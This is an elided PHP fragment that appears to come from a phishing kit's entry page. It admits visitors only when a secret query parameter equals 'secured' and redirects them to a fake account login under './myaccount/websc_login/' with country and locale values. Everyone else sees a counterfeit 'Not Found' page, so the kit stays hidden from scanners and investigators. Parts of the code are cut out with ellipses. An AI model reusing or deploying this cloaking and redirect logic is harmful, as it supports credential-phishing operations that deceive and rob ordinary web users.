...
if(isset($_GET ["MTUwMDU1MTQy"]) && $_GET["MTUwMDU1MTQy"] == "secured"){
include("./myaccount/linguo/lang.php");
$_SESSION['pippa'] = substr($_SESSION['MONSTR_UU'],1,2);
...
header("location:./myaccount/websc_login/?country.x=".$_SESSION['MOCNTRCD']."&locale.x=".$_SESSION['galant'].""); }
	...
	<h1>Not Found</h1>
	<p>The requested document ".$_SERVER["HTTP_URI"]." could not be found on this server.</p>
	<p2><i>".$_SERVER["HTTP_HOST"]." on port ".$_SERVER["SERVER_PORT"]."</i></p2> 
	";
}
?>